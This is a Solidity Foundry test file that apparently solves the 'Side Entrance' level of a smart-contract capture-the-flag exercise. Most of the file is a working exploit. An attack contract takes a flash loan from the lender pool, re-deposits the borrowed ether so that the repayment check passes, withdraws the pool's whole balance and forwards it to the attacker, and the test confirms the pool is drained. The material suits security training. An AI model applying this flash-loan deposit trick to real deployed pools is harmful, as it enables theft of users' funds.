// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        SideEntranceAttackContract attackContract = new SideEntranceAttackContract(address(sideEntranceLenderPool));
        attackContract.attack();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract SideEntranceAttackContract is IFlashLoanEtherReceiver{
    SideEntranceLenderPool sideEntranceLenderPool;
    constructor (address _sideEntranceLenderPool) payable {
        sideEntranceLenderPool = SideEntranceLenderPool(_sideEntranceLenderPool);
    }

    fallback() external payable {
      }

    receive() external payable {
      }

    function attack() external {
        sideEntranceLenderPool.flashLoan(1_000e18);
        sideEntranceLenderPool.withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function execute() external payable override {
        sideEntranceLenderPool.deposit{value: 1_000e18}();
    }
}